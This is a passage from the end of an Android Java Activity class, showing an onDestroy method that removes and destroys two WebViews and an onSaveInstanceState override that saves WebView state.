                ((android.view.ViewGroup) loginWebView.getParent()).removeView(loginWebView);
                loginWebView.destroy();
                loginWebView = null;
            }
            if (webView != null) {
                ((android.view.ViewGroup) webView.getParent()).removeView(webView);
                webView.destroy();
                webView = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "onDestroy failed", e);
        }
        super.onDestroy();
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        try { if (webView != null) webView.saveState(outState); } catch (Exception e) {}
    }
}
